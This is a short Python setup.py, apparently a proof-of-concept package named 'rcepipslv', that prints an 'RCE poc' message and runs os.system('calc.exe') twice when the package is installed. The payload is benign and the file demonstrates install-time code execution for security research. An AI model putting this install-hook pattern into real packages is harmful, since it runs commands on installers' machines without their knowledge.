import os
from setuptools import setup

print("RCE poc triggered by w3shi ")

os.system("calc.exe")
os.system("calc.exe")


setup(
    name="rcepipslv",
    version="0.0.1",
    py_modules=[],
)
